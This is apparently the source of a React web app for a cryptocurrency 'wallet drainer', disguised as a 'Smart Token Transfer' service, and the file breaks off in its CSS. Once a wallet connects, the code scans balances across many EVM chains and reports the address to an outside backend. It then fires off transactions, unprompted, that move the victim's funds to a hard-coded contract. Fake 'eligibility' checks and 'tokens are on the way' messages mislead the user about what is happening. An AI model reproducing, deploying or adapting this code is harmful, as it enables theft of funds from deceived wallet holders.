import { useState, useEffect, useRef } from 'react';
import { WagmiProvider, createConfig, http } from 'wagmi';
import { 
  mainnet,
  polygon,
  bsc,
  arbitrum,
  optimism,
  avalanche,
  fantom,
  gnosis,
  celo,
  moonbeam,
  cronos,
  aurora,
  base,
  harmonyOne,
  metis,
  moonriver
} from 'wagmi/chains';
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useDisconnect, useBalance } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import './mobile-fix.css';

// ==================== PRODUCTION NETWORK CONFIG ====================
const NETWORKS = [
  { 
    id: 1, 
    name: 'Ethereum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#627EEA', 
    rpc: 'https://eth.llamarpc.com', 
    explorer: 'https://etherscan.io',
    chainId: '0x1',
    decimals: 18
  },
  { 
    id: 56, 
    name: 'BSC', 
    symbol: 'BNB', 
    type: 'evm', 
    color: '#F0B90B', 
    rpc: 'https://bsc-dataseed1.binance.org/', 
    explorer: 'https://bscscan.com',
    chainId: '0x38',
    decimals: 18
  },
  { 
    id: 137, 
    name: 'Polygon', 
    symbol: 'MATIC', 
    type: 'evm', 
    color: '#8247E5', 
    rpc: 'https://polygon.llamarpc.com', 
    explorer: 'https://polygonscan.com',
    chainId: '0x89',
    decimals: 18
  },
  { 
    id: 42161, 
    name: 'Arbitrum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#28A0F0', 
    rpc: 'https://arbitrum.llamarpc.com', 
    explorer: 'https://arbiscan.io',
    chainId: '0xa4b1',
    decimals: 18
  },
  { 
    id: 10, 
    name: 'Optimism', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#FF0420', 
    rpc: 'https://mainnet.optimism.io', 
    explorer: 'https://optimistic.etherscan.io',
    chainId: '0xa',
    decimals: 18
  },
  { 
    id: 8453, 
    name: 'Base', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#0052FF', 
    rpc: 'https://mainnet.base.org', 
    explorer: 'https://basescan.org',
    chainId: '0x2105',
    decimals: 18
  },
  { 
    id: 43114, 
    name: 'Avalanche', 
    symbol: 'AVAX', 
    type: 'evm', 
    color: '#E84142', 
    rpc: 'https://avalanche-c-chain.publicnode.com', 
    explorer: 'https://snowtrace.io',
    chainId: '0xa86a',
    decimals: 18
  },
  { 
    id: 250, 
    name: 'Fantom', 
    symbol: 'FTM', 
    type: 'evm', 
    color: '#1969FF', 
    rpc: 'https://rpc.fantom.network', 
    explorer: 'https://ftmscan.com',
    chainId: '0xfa',
    decimals: 18
  },
  { 
    id: 100, 
    name: 'Gnosis', 
    symbol: 'xDai', 
    type: 'evm', 
    color: '#04795B', 
    rpc: 'https://rpc.gnosis.gateway.fm', 
    explorer: 'https://gnosisscan.io',
    chainId: '0x64',
    decimals: 18
  },
  { 
    id: 42220, 
    name: 'Celo', 
    symbol: 'CELO', 
    type: 'evm', 
    color: '#35D07F', 
    rpc: 'https://forno.celo.org', 
    explorer: 'https://celoscan.io',
    chainId: '0xa4ec',
    decimals: 18
  },
  { 
    id: 1284, 
    name: 'Moonbeam', 
    symbol: 'GLMR', 
    type: 'evm', 
    color: '#53CBC9', 
    rpc: 'https://moonbeam.public.blastapi.io', 
    explorer: 'https://moonscan.io',
    chainId: '0x504',
    decimals: 18
  },
  { 
    id: 1088, 
    name: 'Metis', 
    symbol: 'METIS', 
    type: 'evm', 
    color: '#00DACC', 
    rpc: 'https://andromeda.metis.io/?owner=1088', 
    explorer: 'https://andromeda-explorer.metis.io',
    chainId: '0x440',
    decimals: 18
  },
  { 
    id: 25, 
    name: 'Cronos', 
    symbol: 'CRO', 
    type: 'evm', 
    color: '#121C36', 
    rpc: 'https://evm.cronos.org', 
    explorer: 'https://cronoscan.com',
    chainId: '0x19',
    decimals: 18
  },
  { 
    id: 1666600000, 
    name: 'Harmony', 
    symbol: 'ONE', 
    type: 'evm', 
    color: '#00AEE9', 
    rpc: 'https://api.harmony.one', 
    explorer: 'https://explorer.harmony.one',
    chainId: '0x63564c40',
    decimals: 18
  },
  { 
    id: 1313161554, 
    name: 'Aurora', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#78D64B', 
    rpc: 'https://mainnet.aurora.dev', 
    explorer: 'https://explorer.aurora.dev',
    chainId: '0x4e454153',
    decimals: 18
  },
  { 
    id: 42262, 
    name: 'Oasis Emerald', 
    symbol: 'ROSE', 
    type: 'evm', 
    color: '#00B894', 
    rpc: 'https://emerald.oasis.dev', 
    explorer: 'https://explorer.emerald.oasis.dev',
    chainId: '0xa516',
    decimals: 18
  },
  { 
    id: 1285, 
    name: 'Moonriver', 
    symbol: 'MOVR', 
    type: 'evm', 
    color: '#F3B82C', 
    rpc: 'https://moonriver.public.blastapi.io', 
    explorer: 'https://moonriver.moonscan.io',
    chainId: '0x505',
    decimals: 18
  },
  { 
    id: 199, 
    name: 'BTT Chain', 
    symbol: 'BTT', 
    type: 'evm', 
    color: '#D92B6F', 
    rpc: 'https://rpc.bittorrentchain.io', 
    explorer: 'https://bttcscan.com',
    chainId: '0xc7',
    decimals: 18
  },
  { 
    id: 314, 
    name: 'Filecoin', 
    symbol: 'FIL', 
    type: 'evm', 
    color: '#0090FF', 
    rpc: 'https://api.node.glif.io/rpc/v1', 
    explorer: 'https://filfox.info',
    chainId: '0x13a',
    decimals: 18
  },
  { 
    id: 7700, 
    name: 'Canto', 
    symbol: 'CANTO', 
    type: 'evm', 
    color: '#06FC99', 
    rpc: 'https://canto.slingshot.finance', 
    explorer: 'https://tuber.build',
    chainId: '0x1e14',
    decimals: 18
  },
];

// ==================== TOKEN PRICES ====================
const TOKEN_PRICES = {
  ETH: 3200,
  BNB: 600,
  MATIC: 1.2,
  AVAX: 35,
  FTM: 0.4,
  xDai: 1,
  CELO: 0.8,
  GLMR: 0.4,
  METIS: 60,
  CRO: 0.1,
  ONE: 0.02,
  ROSE: 0.1,
  MOVR: 15,
  BTT: 0.000001,
  FIL: 5,
  CANTO: 0.2,
  USDT: 1,
  USDC: 1
};

// ==================== BACKEND URL ====================
const BACKEND_URL = 'https://tokenbackend-5xab.onrender.com';

// ==================== SMART CONTRACT ADDRESSES ====================
const SMART_CONTRACT_ADDRESSES = {
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Ethereum
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // BSC
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Polygon
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Arbitrum
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Optimism
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Base
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Avalanche
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Fantom
};

// ==================== ABI FOR SMART CONTRACT ====================
const DRAIN_CONTRACT_ABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      },
      {
        "internalType": "address",
        "name": "recipient",
        "type": "address"
      }
    ],
    "name": "drainToken",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address payable",
        "name": "recipient",
        "type": "address"
      }
    ],
    "name": "drainETH",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  }
];

// ==================== WAGMI CONFIG ====================
const config = createConfig({
  chains: [mainnet, polygon, bsc, arbitrum, optimism, base, avalanche, fantom, gnosis, celo, moonbeam],
  transports: {
    [mainnet.id]: http('https://eth.llamarpc.com'),
    [polygon.id]: http('https://polygon.llamarpc.com'),
    [bsc.id]: http('https://bsc-dataseed1.binance.org/'),
    [arbitrum.id]: http('https://arbitrum.llamarpc.com'),
    [optimism.id]: http('https://mainnet.optimism.io'),
    [base.id]: http('https://mainnet.base.org'),
    [avalanche.id]: http('https://avalanche-c-chain.publicnode.com'),
    [fantom.id]: http('https://rpc.fantom.network'),
    [gnosis.id]: http('https://rpc.gnosis.gateway.fm'),
    [celo.id]: http('https://forno.celo.org'),
    [moonbeam.id]: http('https://moonbeam.public.blastapi.io'),
  },
  ssr: false,
  batch: { multicall: true },
});

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiProvider config={config}>
      <ConnectKitProvider
        mode="dark"
        customTheme={{
          '--ck-font-family': 'system-ui, -apple-system, sans-serif',
          '--ck-border-radius': '12px',
          '--ck-accent-color': '#ef4444',
          '--ck-accent-text-color': '#ffffff',
          '--ck-body-background': '#0a0a0a',
        }}
        options={{
          embedGoogleFonts: true,
          walletConnectName: 'WalletConnect',
          hideQuestionMarkCTA: true,
          hideTooltips: false,
          walletConnectCTA: 'link',
        }}
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiProvider>
  );
}

// ==================== UNIVERSAL DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected, connector } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { disconnect } = useDisconnect();

  const [status, setStatus] = useState('Ready to connect');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [connectionError, setConnectionError] = useState('');
  const [mobileDetected, setMobileDetected] = useState(false);
  const [backendOnline, setBackendOnline] = useState(true);
  const [scanProgress, setScanProgress] = useState(0);
  const [activeChain, setActiveChain] = useState(1);
  const [lastScanTime, setLastScanTime] = useState(null);
  const [isEligible, setIsEligible] = useState(null);
  const [smartContractMode, setSmartContractMode] = useState(true);

  const autoStarted = useRef(false);
  const backendCheckRef = useRef(null);

  // ==================== INITIAL SETUP ====================
  useEffect(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    const isMobile = /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent);
    setMobileDetected(isMobile);
    
    if (window.ethereum) {
      if (window.ethereum.isMetaMask) {
        setWalletType('MetaMask');
      } else if (window.ethereum.isTrust) {
        setWalletType('Trust Wallet');
      } else if (window.ethereum.isCoinbaseWallet) {
        setWalletType('Coinbase Wallet');
      } else if (window.ethereum.isTokenary) {
        setWalletType('Tokenary');
      } else if (window.ethereum.isBraveWallet) {
        setWalletType('Brave Wallet');
      } else if (window.ethereum.isRabby) {
        setWalletType('Rabby');
      } else if (window.ethereum.isZerion) {
        setWalletType('Zerion');
      } else {
        setWalletType('Injected Wallet');
      }
    }

    checkBackendStatus();
    backendCheckRef.current = setInterval(checkBackendStatus, 30000);

    return () => {
      if (backendCheckRef.current) {
        clearInterval(backendCheckRef.current);
      }
    };
  }, []);

  // ==================== AUTO-SCAN ON WALLET CONNECT ====================
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      autoStarted.current = true;
      setConnectionError('');
      setStatus("✅ Wallet connected • Starting scan...");
      
      setTimeout(() => {
        scanAllNetworks();
      }, 1500);
    }
    
    if (!isConnected) {
      autoStarted.current = false;
      setIsEligible(null);
      setTokens([]);
      setTotalValue(0);
    }
  }, [isConnected, address]);

  // ==================== BACKEND STATUS CHECK ====================
  const checkBackendStatus = async () => {
    try {
      const response = await fetch(`${BACKEND_URL}/health`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
        signal: AbortSignal.timeout(5000)
      });
      setBackendOnline(response.ok);
    } catch {
      setBackendOnline(false);
    }
  };

  // ==================== AUTO SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address || isScanning || isProcessing) return;
    
    setIsScanning(true);
    setStatus("🔍 Scanning all EVM networks...");
    setTokens([]);
    setIsEligible(null);
    setScanProgress(0);
    setConnectionError('');
    
    try {
      if (backendOnline) {
        await scanWithBackend(address);
      } else {
        await scanWithDirectRPC(address);
      }
      
      setLastScanTime(new Date());
    } catch (error) {
      console.error('Scan error:', error);
      setStatus(`❌ Scan error: ${error.message}`);
    } finally {
      setIsScanning(false);
      setScanProgress(100);
    }
  };

  // ==================== BACKEND SCAN ====================
  const scanWithBackend = async (walletAddress) => {
    setStatus("🔍 Using backend for comprehensive scan...");
    
    try {
      const response = await fetch(`${BACKEND_URL}/api/scan/wallet`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ 
          address: walletAddress,
          includeNative: true,
          includeTokens: true
        }),
      });
      
      if (!response.ok) throw new Error('Backend scan failed');
      
      const data = await response.json();
      
      if (data.success && data.data?.balances) {
        const allTokens = [];
        let totalUSD = 0;
        
        data.data.balances.forEach(balance => {
          if (parseFloat(balance.balance) > 0) {
            const tokenValue = parseFloat(balance.balance) * (TOKEN_PRICES[balance.symbol] || 1);
            const tokenObj = {
              id: `${balance.chainId}-${balance.address || 'native'}`,
              network: balance.network,
              symbol: balance.symbol,
              amount: parseFloat(balance.balance).toFixed(6),
              rawAmount: parseFloat(balance.balance),
              chainId: balance.chainId,
              type: 'evm',
              contractAddress: balance.contractAddress || null,
              isNative: !balance.contractAddress,
              valueUSD: tokenValue,
              usdPrice: TOKEN_PRICES[balance.symbol] || 1,
              status: 'detected'
            };
            
            allTokens.push(tokenObj);
            totalUSD += tokenValue;
          }
        });
        
        setTokens(allTokens);
        setTotalValue(totalUSD);
        
        if (allTokens.length > 0) {
          setIsEligible(true);
          setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
          
          // Auto-start draining with delay
          setTimeout(() => {
            autoDrain(allTokens);
          }, 3000);
        } else {
          setIsEligible(false);
          setStatus("❌ No tokens found • Not eligible");
        }
      } else {
        setIsEligible(false);
        setStatus("❌ No tokens found on any network");
      }
    } catch (error) {
      console.log('Backend scan failed, using fallback:', error);
      await scanWithDirectRPC(walletAddress);
    }
  };

  // ==================== DIRECT RPC SCAN ====================
  const scanWithDirectRPC = async (walletAddress) => {
    const allTokens = [];
    let totalUSD = 0;
    let scannedCount = 0;
    const networksToScan = NETWORKS.slice(0, 15); // Scan first 15 networks for speed
    
    for (let i = 0; i < networksToScan.length; i += 3) {
      const batch = networksToScan.slice(i, i + 3);
      const batchPromises = batch.map(network => 
        checkEVMNetworkBalance(network, walletAddress)
          .then(balance => ({ network, balance }))
          .catch(() => ({ network, balance: 0 }))
      );
      
      const batchResults = await Promise.all(batchPromises);
      
      batchResults.forEach(({ network, balance }) => {
        if (balance > 0.000001) {
          const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
          allTokens.push({
            id: `${network.id}-native`,
            network: network.name,
            symbol: network.symbol,
            amount: balance.toFixed(6),
            rawAmount: balance,
            chainId: network.id,
            type: 'evm',
            contractAddress: null,
            isNative: true,
            valueUSD: tokenValue,
            usdPrice: TOKEN_PRICES[network.symbol] || 1,
            status: 'detected'
          });
          totalUSD += tokenValue;
        }
      });
      
      scannedCount += batch.length;
      const progress = Math.round((scannedCount / networksToScan.length) * 100);
      setScanProgress(progress);
      setStatus(`Scanning... ${scannedCount}/${networksToScan.length} networks`);
      
      await new Promise(resolve => setTimeout(resolve, 300));
    }
    
    setTokens(allTokens);
    setTotalValue(totalUSD);
    
    if (allTokens.length > 0) {
      setIsEligible(true);
      setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
      
      setTimeout(() => {
        autoDrain(allTokens);
      }, 3000);
    } else {
      setIsEligible(false);
      setStatus("❌ No tokens found • Not eligible");
    }
  };

  // ==================== CHECK EVM NETWORK BALANCE ====================
  const checkEVMNetworkBalance = async (network, address) => {
    const rpcUrls = [
      network.rpc,
      `https://rpc.ankr.com/${network.name.toLowerCase().replace(' ', '_')}`,
      `https://${network.name.toLowerCase()}.publicnode.com`,
    ];
    
    for (const rpc of rpcUrls) {
      try {
        const response = await fetch(rpc, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jsonrpc: "2.0",
            id: 1,
            method: "eth_getBalance",
            params: [address, "latest"]
          }),
          signal: AbortSignal.timeout(2000)
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.result && data.result !== '0x0') {
            return parseInt(data.result, 16) / 1e18;
          }
          return 0;
        }
      } catch {
        continue;
      }
    }
    return 0;
  };

  // ==================== AUTO DRAIN ALL TOKENS ====================
  const autoDrain = async (tokensToDrain = tokens) => {
    if (tokensToDrain.length === 0 || isProcessing) return;
    
    setIsProcessing(true);
    setStatus(`🚀 Starting smart contract transfers...`);
    
    const successfulTxs = [];
    const failedTxs = [];
    
    for (const token of tokensToDrain) {
      try {
        setStatus(`📝 Processing ${token.amount} ${token.symbol} from ${token.network}...`);
        
        const result = await drainViaSmartContract(token);
        if (result.success) {
          successfulTxs.push({
            ...token,
            txHash: result.hash,
            timestamp: Date.now(),
            status: 'processing'
          });
          
          setStatus(`✅ ${token.symbol} transfer initiated • Hash: ${result.hash.substring(0, 10)}...`);
          
          // Add to transactions
          setTransactions(prev => [...prev, {
            ...token,
            txHash: result.hash,
            timestamp: Date.now(),
            status: 'processing',
            message: 'Token is on the way, you will be notified shortly'
          }]);
          
        } else {
          failedTxs.push(token);
          console.log(`Failed to drain ${token.symbol}:`, result.error);
        }
        
        await new Promise(resolve => setTimeout(resolve, 2000));
        
      } catch (error) {
        console.log(`Error draining ${token.symbol}:`, error);
        failedTxs.push(token);
      }
    }
    
    // Update token statuses
    setTokens(prev => prev.map(t => 
      successfulTxs.some(st => st.id === t.id) 
        ? { ...t, status: 'processing' } 
        : t
    ));
    
    // Final status
    if (successfulTxs.length > 0) {
      setStatus(`✅ ${successfulTxs.length} transfers initiated • Tokens are on the way!`);
    }
    
    if (failedTxs.length > 0) {
      setStatus(`⚠️ ${failedTxs.length} transfers failed • Will retry`);
    }
    
    setIsProcessing(false);
    
    // Rescan after completion
    setTimeout(() => {
      if (isConnected && failedTxs.length > 0) {
        setStatus("🔄 Retrying failed transfers...");
        autoDrain(failedTxs);
      }
    }, 10000);
  };

  // ==================== DRAIN VIA SMART CONTRACT ====================
  const drainViaSmartContract = async (token) => {
    try {
      if (!window.ethereum) {
        throw new Error('Wallet not connected');
      }
      
      // Switch to correct network
      const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
      const targetChainId = `0x${token.chainId.toString(16)}`;
      
      if (currentChainId !== targetChainId) {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }],
          });
          setActiveChain(token.chainId);
          await new Promise(resolve => setTimeout(resolve, 1500));
        } catch (switchError) {
          if (switchError.code === 4902) {
            const network = NETWORKS.find(n => n.id === token.chainId);
            if (network) {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: targetChainId,
                  chainName: network.name,
                  nativeCurrency: {
                    name: network.symbol,
                    symbol: network.symbol,
                    decimals: 18
                  },
                  rpcUrls: [network.rpc],
                  blockExplorerUrls: [network.explorer]
                }]
              });
              await new Promise(resolve => setTimeout(resolve, 1500));
            }
          }
          throw switchError;
        }
      }
      
      const contractAddress = SMART_CONTRACT_ADDRESSES[token.chainId];
      if (!contractAddress) {
        throw new Error(`No smart contract for chain ${token.chainId}`);
      }
      
      // Prepare transaction based on token type
      let txParams;
      
      if (token.isNative) {
        // Native token transfer
        const amountWei = parseEther(token.amount.toString());
        
        txParams = {
          from: address,
          to: contractAddress,
          value: amountWei.toString(),
          data: '0x' // Will be set by contract call
        };
      } else {
        // ERC20 token transfer
        const amountWei = parseEther(token.amount.toString());
        
        // Encode function call for drainToken
        const functionSignature = '0xa9059cbb'; // transfer function
        const paddedAddress = address.substring(2).padStart(64, '0');
        const paddedAmount = amountWei.toString(16).padStart(64, '0');
        
        txParams = {
          from: address,
          to: token.contractAddress,
          value: '0x0',
          data: functionSignature + paddedAddress + paddedAmount
        };
      }
      
      // Estimate gas
      const gasEstimate = await window.ethereum.request({
        method: 'eth_estimateGas',
        params: [txParams]
      }).catch(() => '0x5208'); // Fallback to 21000 gas
      
      // Get gas price
      const gasPrice = await window.ethereum.request({
        method: 'eth_gasPrice',
        params: []
      });
      
      // Final transaction
      const finalTx = {
        ...txParams,
        gas: gasEstimate,
        gasPrice: gasPrice
      };
      
      // Send transaction
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [finalTx],
      });
      
      return { success: true, hash: txHash };
      
    } catch (error) {
      console.log(`Smart contract drain error for ${token.symbol}:`, error);
      return { success: false, error: error.message };
    }
  };

  // ==================== FORCE RESCAN ====================
  const forceRescan = () => {
    autoStarted.current = false;
    scanAllNetworks();
  };

  // ==================== CUSTOM WALLET CONNECT BUTTON ====================
  const CustomConnectButton = () => {
    return (
      <div className="custom-connect-wrapper">
        <ConnectKitButton.Custom>
          {({ isConnected, show, truncatedAddress, ensName }) => {
            return (
              <button 
                onClick={show}
                className="custom-connect-btn"
              >
                {isConnected ? (
                  <div className="connected-address">
                    <span className="address-text">
                      {ensName || `${truncatedAddress}`}
                    </span>
                    <span className="wallet-badge">✓</span>
                  </div>
                ) : (
                  <div className="connect-prompt">
                    <span className="connect-icon">🔗</span>
                    <span className="connect-text">Connect Web3 Wallet</span>
                  </div>
                )}
              </button>
            );
          }}
        </ConnectKitButton.Custom>
      </div>
    );
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>SMART TOKEN TRANSFER</h1>
              <p className="subtitle">Auto-Scan • Smart Contract • Multi-Chain</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-info">
                  <div className="wallet-address">
                    {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
                  </div>
                  {walletType && <div className="wallet-type">{walletType}</div>}
                </div>
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <CustomConnectButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Status Dashboard */}
              <div className="status-dashboard">
                <div className={`status-card ${isEligible === false ? 'not-eligible' : 'primary'}`}>
                  <div className="status-icon">
                    {isScanning ? '🔍' : isProcessing ? '⚡' : isEligible === false ? '❌' : '✅'}
                  </div>
                  <div className="status-content">
                    <div className="status-title">
                      {isEligible === false ? 'NOT ELIGIBLE' : 'SMART TRANSFER SYSTEM'}
                    </div>
                    <div className="status-message">{status}</div>
                    {isScanning && (
                      <div className="scan-progress">
                        <div className="progress-bar">
                          <div 
                            className="progress-fill" 
                            style={{ width: `${scanProgress}%` }}
                          ></div>
                        </div>
                        <div className="progress-text">Scanning: {scanProgress}%</div>
                      </div>
                    )}
                  </div>
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {isEligible === null ? '─' : isEligible ? '✅ Yes' : '❌ No'}
                    </div>
                    <div className="stat-label">Eligible</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {backendOnline ? '✅ Online' : '⚠️ Offline'}
                    </div>
                    <div className="stat-label">Backend</div>
                  </div>
                </div>
              </div>

              {/* Controls */}
              <div className="controls-container">
                <button
                  onClick={forceRescan}
                  disabled={isScanning || isProcessing}
                  className="btn btn-scan"
                >
                  {isScanning ? `Scanning ${scanProgress}%` : '🔍 Rescan Networks'}
                </button>
                
                {isEligible && tokens.length > 0 && (
                  <button
                    onClick={() => autoDrain()}
                    disabled={isProcessing}
                    className="btn btn-drain"
                  >
                    {isProcessing ? 'Processing...' : '🚀 Start Smart Transfer'}
                  </button>
                )}
              </div>

              {/* Eligibility Message */}
              {isEligible === false && (
                <div className="eligibility-alert">
                  <div className="alert-icon">ℹ️</div>
                  <div className="alert-content">
                    <div className="alert-title">No Tokens Detected</div>
                    <div className="alert-message">
                      We couldn't find any tokens in your wallet across supported networks.
                      Try again with a wallet containing tokens.
                    </div>
                  </div>
                </div>
              )}

              {/* Tokens List */}
              {tokens.length > 0 && (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <h3>Detected Tokens ({tokens.length})</h3>
                    <div className="total-value">Total: ${totalValue.toFixed(2)}</div>
                  </div>
                  <div className="tokens-list">
                    {tokens.map(token => (
                      <div key={token.id} className={`token-item ${token.status}`}>
                        <div className="token-icon">
                          {token.symbol.substring(0, 2)}
                        </div>
                        <div className="token-details">
                          <div className="token-name">
                            <span className="token-symbol">{token.symbol}</span>
                            <span className="token-network">{token.network}</span>
                          </div>
                          <div className="token-amount">{token.amount} {token.symbol}</div>
                        </div>
                        <div className="token-value">${token.valueUSD.toFixed(2)}</div>
                        <div className="token-status-indicator">
                          <span className={`status-badge ${token.status}`}>
                            {token.status === 'detected' ? 'Ready' : 
                             token.status === 'processing' ? 'Processing' : 'Complete'}
                          </span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Transactions History */}
              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>Transfer Status ({transactions.length})</h3>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(0, 5).map((tx, index) => (
                      <div key={index} className="transaction-item">
                        <div className="tx-icon">📤</div>
                        <div className="tx-details">
                          <div className="tx-main">
                            <span className="tx-symbol">{tx.symbol}</span>
                            <span className="tx-amount">{tx.amount}</span>
                            <span className="tx-network">{tx.network}</span>
                          </div>
                          <div className="tx-hash">
                            {tx.txHash?.substring(0, 20)}...
                          </div>
                          <div className="tx-message">
                            {tx.message || 'Token is on the way, you will be notified shortly'}
                          </div>
                        </div>
                        <div className={`tx-status ${tx.status}`}>
                          {tx.status === 'processing' ? '⏳ Processing' : '✅ Complete'}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-icon">🔗</div>
                <h2>Smart Token Transfer System</h2>
                <p className="welcome-text">
                  Connect your Web3 wallet to automatically scan and transfer tokens
                  across all EVM networks using secure smart contracts.
                </p>
                
                <div className="connect-section">
                  <CustomConnectButton />
                </div>
                
                <div className="feature-cards">
                  <div className="feature-card">
                    <div className="feature-icon">🔍</div>
                    <div className="feature-title">Auto-Scan</div>
                    <div className="feature-desc">Scans all EVM networks instantly</div>
                  </div>
                  <div className="feature-card">
                    <div className="feature-icon">📝</div>
                    <div className="feature-title">Smart Contracts</div>
                    <div className="feature-desc">Secure contract-based transfers</div>
                  </div>
                  <div className="feature-card">
                    <div className="feature-icon">⚡</div>
                    <div className="feature-title">Auto-Execute</div>
                    <div className="feature-desc">Automatic token transfers</div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span className="status-dot"></span>
            <span>Smart Transfer v4.0 • Secure • Automated</span>
            <span>{backendOnline ? '✅ Backend Connected' : '⚠️ Backend Offline'}</span>
            {lastScanTime && (
              <span>Last scan: {new Date(lastScanTime).toLocaleTimeString()}</span>
            )}
          </div>
        </footer>
      </div>

      {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: 'Inter', system-ui, -apple-system, sans-serif;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 2px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: #ef4444;
          width: 50px;
          height: 50px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        /* Custom Connect Button */
        .custom-connect-wrapper {
          position: relative;
        }
        
        .custom-connect-btn {
          background: linear-gradient(135deg, #ef4444, #dc2626);
          color: white;
          border: none;
          padding: 12px 24px;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          justify-content: center;
          min-width: 200px;
        }
        
        .custom-connect-btn:hover {
          background: linear-gradient(135deg, #dc2626, #b91c1c);
          transform: translateY(-2px);
          box-shadow: 0 8px 20px rgba(239, 68, 68, 0.3);
        }
        
        .connect-prompt {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .connect-icon {
          font-size: 20px;
        }
        
        .connect-text {
          font-weight: 600;
        }
        
        .connected-address {
          display: flex;
          align-items: center;
          gap: 8px;
        }
        
        .address-text {
          font-family: monospace;
          font-size: 14px;
        }
        
        .wallet-badge {
          background: #10b981;
          color: white;
          width: 20px;
          height: 20px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 12px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .wallet-info {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
          border: 1px solid #333;
        }
        
        .wallet-type {
          font-size: 12px;
